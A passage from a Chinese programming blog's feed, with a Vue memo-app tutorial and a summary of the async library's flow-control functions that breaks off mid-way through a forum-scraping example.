    <content type="html"><![CDATA[<p><strong>感想</strong></p><p>我在茫茫的海洋里探寻着前进的方向，那是支撑我走下去的动力。当面对复杂的业务逻辑时，当想要干件大事却力不从心时，多少迷茫，多少灰心丧气。</p><p>人类的欲望促使着大脑不断思考，改进技术，进而提高生产力。人类的懒惰，促使着我们去寻找更加方便的工具解放我们的双手。</p><p>各种生产活动亦如此，应用开发亦是如此。为了提高生产力，我们要自动化； 为了方便复用，我们要组件化… …</p><p><strong>文章</strong><br>见识过React后再来看看Vue,发现它如此轻盈易于上手，但又不失优雅。奉上一个应用实例，初步感受一下思想的美。</p><p>应用UI比较简单，主要是一些数据的逻辑。先上一幅效果图：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/showMemo.png" alt="showMemo"></p><a id="more"></a><p>Vuejs作为一款MVVM框架，既有像Angular那样的丰富指令集，数据双向绑定，又与React一样强调组件化开发。更重要的，作者是中国人啊！作者是中国人的一个好处那就是，文档支持非常好，学习起来是非常容易的。。。</p><p>细节不多讲，因为文档已经够好，我这里来个实践，就感受下写起来爽不爽。</p><h3 id="分析整个应用结构"><a href="#分析整个应用结构" class="headerlink" title="分析整个应用结构"></a>分析整个应用结构</h3><p>拿到一个需求最先开始的是什么，当然得先分析分析，我们看看我们最终要的结果：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/createMemo.png" alt="create"><br><img src="http://7xsi10.com1.z0.glb.clouddn.com/Mainpage.png" alt="home"></p><p>可以看到，整个应用分为三个功能，首页，查看备忘录，创建备忘录。它们虽然处于不同的页面，但是它们有一个共同点，那就是它们要共享一个数据，那便是备忘录数据。</p><p>这份数据应该怎么管理呢？是每个页面都自己做自己的？NO,那样的话你会发现，数据是不好维护的。</p><p>我们的做法是: 一个公共组件用于管理数据，三个功能分别是一个子组件，通过父子组件的通信来完成数据的通信。本文的例子比较简单，所以这种方式绰绰有余，对于更复杂的应用，Vue提供了类似React的flux实现:Vuex用于管理大型应用的状态。</p><p>而父子组件的关系建立，我们可以用到Vue-router，它的设计本身就是为开发单页面应用(SPA)设计的，平时我们分页怎么做？要么全写出来，然后设置显示隐藏，要么发起异步请求，获取不同页面，我们现在怎么做？整个应用的内容动态渲染，通过路由设置不同url下的组件，这样应用非常流畅。</p><p>单页应用虽好，但也有一些问题，需要不断去寻求解决办法，如首屏加载优化，SEO问题等等。</p><h3 id="我们的技术栈"><a href="#我们的技术栈" class="headerlink" title="我们的技术栈"></a>我们的技术栈</h3><p>分析需求了，现在该干什么？当然是技术栈的选型了。</p><p><strong>UI框架</strong>：就用bootstrap吧；<br><strong>开发工具</strong>:Webpack<br><strong>代码</strong>: Vue,ES2015<br><strong>服务器</strong>: express<br><strong>数据库</strong>: 为了方便，我就用本地数据库吧</p><h3 id="搭建开发环境"><a href="#搭建开发环境" class="headerlink" title="搭建开发环境"></a>搭建开发环境</h3><p>Vue开源了自己的一款脚手架工具：Vue-cli,用于快速搭建开发环境，并提供了好几种模板，我选用的是Webpack模板，因为平时Webpack用得比较多。</p><p><strong>初始化项目</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack testApp</span><br></pre></td></tr></table></figure></p><p><strong>进入testApp安装依赖</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure></p><p><strong>运行</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure></p><p>我是将所有生产的文件都放在dist目录的，包括index.html，只需要修改webpack-html-plugin的配置就好了。</p><p>现在已经处于开发环境了，访问localhost:8080/dist/index.html就开始开发了。</p><p>Webpack使用就不用说了吧，前面文章我也写过。</p><h3 id="Let’s-GO"><a href="#Let’s-GO" class="headerlink" title="Let’s GO"></a>Let’s GO</h3><h4 id="入口文件-main-js"><a href="#入口文件-main-js" class="headerlink" title="入口文件:main.js"></a>入口文件:main.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./components/App.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">'./components/Home.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Show <span class="keyword">from</span> <span class="string">'./components/Show.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Create <span class="keyword">from</span> <span class="string">'./components/Create.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Stylesheet <span class="keyword">from</span> <span class="string">'./assets/style/main.css'</span>;</span><br><span class="line"><span class="keyword">var</span> VueRouter = <span class="built_in">require</span>(<span class="string">'vue-router'</span>);</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br><span class="line"><span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter();</span><br><span class="line"></span><br><span class="line">router.map(&#123;</span><br><span class="line">    <span class="string">'/Home'</span>:&#123;</span><br><span class="line">        component: Home</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'/Show'</span>:&#123;</span><br><span class="line">        component: Show</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'/Create'</span>:&#123;</span><br><span class="line">        component: Create</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.redirect(&#123;</span><br><span class="line">  <span class="string">'*'</span>:<span class="string">'/Show'</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.start(App,<span class="string">'#app'</span>);</span><br></pre></td></tr></table></figure><p>看到了什么，我们定义一个路由器，管理三个路径，对应三个功能，App作为公告的组件</p><h4 id="编写公共组件，用于全局管理数据-模板和样式我就省略了吧，完整版我的github上有呢。"><a href="#编写公共组件，用于全局管理数据-模板和样式我就省略了吧，完整版我的github上有呢。" class="headerlink" title="编写公共组件，用于全局管理数据,模板和样式我就省略了吧，完整版我的github上有呢。"></a>编写公共组件，用于全局管理数据,模板和样式我就省略了吧，完整版我的<a href="https://github.com/laoqiren" target="_blank" rel="noopener">github</a>上有呢。</h4><p>本文的例子比较简单，所以这种方式绰绰有余，Vue提供了类似React的flux实现:Vuex用于管理大型应用的状态。</p><p>App.vue<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> DataBase <span class="keyword">from</span> <span class="string">'./storage.js'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    created()&#123;</span><br><span class="line">        <span class="keyword">var</span> memos = DataBase.query();</span><br><span class="line">        <span class="comment">//console.log(memos)</span></span><br><span class="line">        <span class="keyword">this</span>.memos = memos;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.memos);</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            memos:[],</span><br><span class="line">            hasNew: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    events: &#123;</span><br><span class="line">        memoUpdate(memo)&#123;</span><br><span class="line">            <span class="keyword">this</span>.hasNew = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">this</span>.memos.push(memo);</span><br><span class="line">            <span class="built_in">console</span>.log(memo.memo)</span><br><span class="line">            DataBase.add(memo.date,memo.time,memo.place,memo.memo);</span><br><span class="line">        &#125;,</span><br><span class="line">        memoDelete(index)&#123;</span><br><span class="line">            <span class="comment">//console.log(index);</span></span><br><span class="line">            <span class="keyword">this</span>.memos.splice(index,<span class="number">1</span>);</span><br><span class="line">            DataBase.deleteM(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        clearNew()&#123;</span><br><span class="line">            <span class="keyword">this</span>.hasNew = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，它是怎么管理数据的呢?</p><p><strong>初始化数据</strong>:从数据库访问到数据<br><strong>分发数据</strong>:通过props向各个子组件传递数据<br><strong>响应修改</strong>这个通过事件来完成响应，包括删除，增加，而它们分别是在子组件触发的，然后一路冒泡通知给App组件，这样，子组件的行动尽在掌握之中，操作数据库的行为只交给公共组件。这样是不是感觉整个应用是如此的清晰？</p><h4 id="编写数据库"><a href="#编写数据库" class="headerlink" title="编写数据库"></a>编写数据库</h4><p>采用本地SQLite数据库，storage.js暴露一个对象，拥有各个操作数据库的方法，然后让App.vue导入</p><p>代码省略，详情看<a href="https://github.com/laoqiren" target="_blank" rel="noopener">我的github</a></p><h4 id="编写首页Home-vue"><a href="#编写首页Home-vue" class="headerlink" title="编写首页Home.vue"></a>编写首页Home.vue</h4><p>首页的组件要获取数据，计算出备忘录总数，比较简单:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    props:[<span class="string">'memos'</span>],</span><br><span class="line">    computed: &#123;</span><br><span class="line">        total()&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.memos.length;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="编写显示目录Show-vue"><a href="#编写显示目录Show-vue" class="headerlink" title="编写显示目录Show.vue"></a>编写显示目录Show.vue</h4><p>获取数据，然后v-for列表渲染，这里有一个删除的戏码，在显示的时候，每条可以选择性地删除啊。所以就要监听删除的事件，并派发给父组件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    props: [<span class="string">'memos'</span>],</span><br><span class="line">    methods: &#123;</span><br><span class="line">        deleteM(memo)&#123;</span><br><span class="line">            <span class="keyword">let</span> index = <span class="keyword">this</span>.memos.indexOf(memo);</span><br><span class="line">            <span class="keyword">this</span>.$dispatch(<span class="string">'memoDelete'</span>,index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="剩下的创建目录Create-vue"><a href="#剩下的创建目录Create-vue" class="headerlink" title="剩下的创建目录Create.vue"></a>剩下的创建目录Create.vue</h4><p>这里有一个增加数据的戏码。要监听增加数据的事件，然后还要派发上去，还得将增加的数据以对象的形式传参，这个数据对象是要通过双向数据绑定来不断地随表单输入而获取最新版本的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            memo:&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        save()&#123;</span><br><span class="line">            <span class="keyword">var</span> memo = <span class="keyword">this</span>.memo;</span><br><span class="line">            <span class="keyword">this</span>.$dispatch(<span class="string">'memoUpdate'</span>, memo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>有没有感觉很爽？反正我是这么觉得的。这个例子比较简单，但是从这一个简单的例子中我们可以看到用Vue开发大型应用的潜力，而且能够我们以享受。</p><p>写代码要写得舒心，就好比我要选择一款自己喜欢的编辑器背景一样，我想让我的开发过程乐趣无穷，而编码的过程，要想转枯燥的工作为享受是要做多方面努力的，你得有工具来代替你做复杂重复的工作，你得有好多应用结构，让自己写得那么随心所欲，尽在掌握，你得。。。。。。</p><p><strong>总之，我们追寻的不是一款最好最牛逼的框架，而是一种思想的美丽，有了思想才会进步。</strong></p><p>以一篇实例文章开始，揭开一探究竟的序幕。</p><p>这或许是开学前的最后一篇文章了，大二了，我有许多要学习的，也有许多自己要去改进的，还有美丽的大学生活。加油。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;感想&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我在茫茫的海洋里探寻着前进的方向，那是支撑我走下去的动力。当面对复杂的业务逻辑时，当想要干件大事却力不从心时，多少迷茫，多少灰心丧气。&lt;/p&gt;
&lt;p&gt;人类的欲望促使着大脑不断思考，改进技术，进而提高生产力。人类的懒惰，促使着我们去寻找更加方便的工具解放我们的双手。&lt;/p&gt;
&lt;p&gt;各种生产活动亦如此，应用开发亦是如此。为了提高生产力，我们要自动化； 为了方便复用，我们要组件化… …&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章&lt;/strong&gt;&lt;br&gt;见识过React后再来看看Vue,发现它如此轻盈易于上手，但又不失优雅。奉上一个应用实例，初步感受一下思想的美。&lt;/p&gt;
&lt;p&gt;应用UI比较简单，主要是一些数据的逻辑。先上一幅效果图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/showMemo.png&quot; alt=&quot;showMemo&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vue" scheme="http://luoxia.me/code/categories/Vue/"/>
    
    
      <category term="VueJS" scheme="http://luoxia.me/code/tags/VueJS/"/>
    
      <category term="WebApp" scheme="http://luoxia.me/code/tags/WebApp/"/>
    
  </entry>
  
  <entry>
    <title>async流程控制</title>
    <link href="http://luoxia.me/code/2016/08/30/async%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
    <id>http://luoxia.me/code/2016/08/30/async流程控制/</id>
    <published>2016-08-30T13:17:51.000Z</published>
    <updated>2017-11-16T13:10:06.486Z</updated>
    
    <content type="html"><![CDATA[<p>async是一个异步操作工具集，其集合操作完美地融合了函数式编程。其各种流程控制API适合各种应用场景。本文总结一些常用的。</p><a id="more"></a><h2 id="async-series"><a href="#async-series" class="headerlink" title="async.series()"></a>async.series()</h2><p>前后无依赖地串行执行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.series([</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt.txt"</span>),<span class="string">'utf-8'</span>),</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt2.txt"</span>),<span class="string">'utf-8'</span>),</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt4.txt"</span>),<span class="string">'utf-8'</span>)</span><br><span class="line">],(err,results)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// [ 'hello\nworld', 'hello,I\'m showData', 'yohe,I\'m txt4.txt' ]</span></span><br></pre></td></tr></table></figure></p><p>这个相当于串行版本的<code>Promise.all()</code>,这里<code>async.apply()</code>类似于<code>_.curry()</code>；</p><h2 id="async-waterfall"><a href="#async-waterfall" class="headerlink" title="async.waterfall()"></a>async.waterfall()</h2><p>前后可多依赖的串行执行:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.waterfall([</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt.txt"</span>),<span class="string">'utf-8'</span>),</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">content,cb</span>)</span>&#123;</span><br><span class="line">        cb(<span class="literal">null</span>,<span class="string">"hello,I'm showData"</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">content,cb</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(content); <span class="comment">//hello,I'm showData</span></span><br><span class="line">        fs.writeFile(path.join(__dirname,<span class="string">"../assets/txt3.txt"</span>),content,err=&gt;&#123;</span><br><span class="line">            cb(<span class="literal">null</span>,<span class="string">"hello,I'm writeData"</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">],(err,result)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result); <span class="comment">//hello,I'm writeData</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>这个相当于<code>Promise.then()</code>链式调用。</p><h2 id="async-parallelLimit"><a href="#async-parallelLimit" class="headerlink" title="async.parallelLimit()"></a>async.parallelLimit()</h2><p>可控制并发量的并行执行：（async.reflect()用于包裹任务，使其发生错误时不会影响其他任务执行，错误信息将作为最后结果之一）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.parallelLimit([</span><br><span class="line">    <span class="keyword">async</span>.reflect(<span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt.txt"</span>),<span class="string">'utf-8'</span>)),</span><br><span class="line">    <span class="keyword">async</span>.reflect(<span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/notExist.txt"</span>),<span class="string">'utf-8'</span>)),</span><br><span class="line">    <span class="keyword">async</span>.reflect(<span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt4.txt"</span>),<span class="string">'utf-8'</span>))</span><br><span class="line">],<span class="number">2</span>,(err,results)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     [  &#123; value: 'hello\nworld' &#125;,</span></span><br><span class="line"><span class="comment">        &#123; error: </span></span><br><span class="line"><span class="comment">            &#123; Error: ENOENT: no such file or directory...&#125; </span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        &#123; value: 'yohe,I\'m txt4.txt' &#125; ]</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>或者<code>reflectAll()</code>改进版：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tasks = [</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt.txt"</span>),<span class="string">'utf-8'</span>),</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt2.txt"</span>),<span class="string">'utf-8'</span>),</span><br><span class="line">    <span class="keyword">async</span>.apply(fs.readFile,path.join(__dirname,<span class="string">"../assets/txt4.txt"</span>),<span class="string">'utf-8'</span>)</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span>.parallelLimit(<span class="keyword">async</span>.reflectAll(tasks),<span class="number">2</span>,(err,results)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err.stack);</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="async-queue"><a href="#async-queue" class="headerlink" title="async.queue()"></a>async.queue()</h2><p>可控制并发量的，且可动态添加任务的并发执行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> q = <span class="keyword">async</span>.queue(<span class="function">(<span class="params">file,cb</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//console.log(`hello,$&#123;file&#125;`);</span></span><br><span class="line">    fs.readFile(dirName + file,<span class="string">'utf-8'</span>,cb);</span><br><span class="line">&#125;,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">q.drain = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"all tasks have completed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs.readdirSync(dirName).forEach(<span class="function"><span class="params">file</span>=&gt;</span>&#123;</span><br><span class="line">    q.push(file,(err,data)=&gt;&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="async-compose"><a href="#async-compose" class="headerlink" title="async.compose()"></a>async.compose()</h2><p>类似于单依赖地串行执行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readData</span>(<span class="params">fileName,cb</span>)</span>&#123;</span><br><span class="line">    fs.readFile(path.join(__dirname,<span class="string">"../assets/"</span> + fileName),<span class="string">'utf-8'</span>,cb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showData</span>(<span class="params">content,cb</span>)</span>&#123;</span><br><span class="line">    cb(<span class="literal">null</span>,<span class="string">"Hello,I'm showData"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeData</span>(<span class="params">content,cb</span>)</span>&#123;</span><br><span class="line">    fs.writeFile(path.join(__dirname,<span class="string">"../assets/txt3.txt"</span>),content,err=&gt;&#123;</span><br><span class="line">        cb(<span class="literal">null</span>,<span class="string">"hello,I'm writeData"</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> readShowWrite = <span class="keyword">async</span>.compose(writeData,showData,readData);</span><br><span class="line"></span><br><span class="line">readShowWrite(<span class="string">"txt.txt"</span>,(err,result)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result); <span class="comment">// hello,I'm writeData</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="async-times"><a href="#async-times" class="headerlink" title="async.times()"></a>async.times()</h2><p>针对同一异步操作并发执行指定次数。这里使用<code>timesLimit</code>控制并发量，一个抓取CNode论坛帖子的例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">async</span> = <span class="built_in">require</span>(<span class="string">"async"</span>);</span><br><span class="line"><span class="keyword">const</span> superagent = <span class="built_in">require</span>(<span class="string">'superagent'</span>);</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">'cheerio'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cnodeUrl = <span class="string">'https://cnodejs.org/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afterGetTopicUrls</span>(<span class="params">topicUrls</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">async</span>.timesLimit(topicUrls.length,<span class="number">5</span>,(n,next)=&gt;&#123;</span><br><span class="line">        <span class="keyword">let</span> topicUrl = topicUrls[n];</span><br><span class="line">         superagent.get(topicUrl)</span><br><span class="line">             .end(<span class="function">(<span class="params">err,res</span>)=&gt;</span>&#123;</span><br><span class="line">                 next(<span class="literal">null</span>,[topicUrl,res.text]);</span><br><span class="line">             &#125;)</span><br><span class="line">     &#125;,(err,topics)=&gt;&#123;</span><br><span class="line">         <span class="comment">// 开始行动</span></span><br><span class="line">        topics = topics.map(<span class="function"><span class="keyword">function</span> (<span class="params">topicPair</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> topicUrl = topicPair[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> topicHtml = topicPair[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> $ = cheerio.load(topicHtml);</span><br><span class="line">            <span class="keyword">return</span> (&#123;</span><br><span class="line">            title: $(<span class="string">'.topic_full_title'</span>).text().trim(),</span><br><span class="line">            href: topicUrl,</span><br><span class="line">            comment1: $(<span class="string">'.reply_content'</span>).eq(<span class="number">0</span>).text().trim(),</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'final:'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(topics);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">superagent.get(cnodeUrl)</span><br><span class="line">  .end(<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) 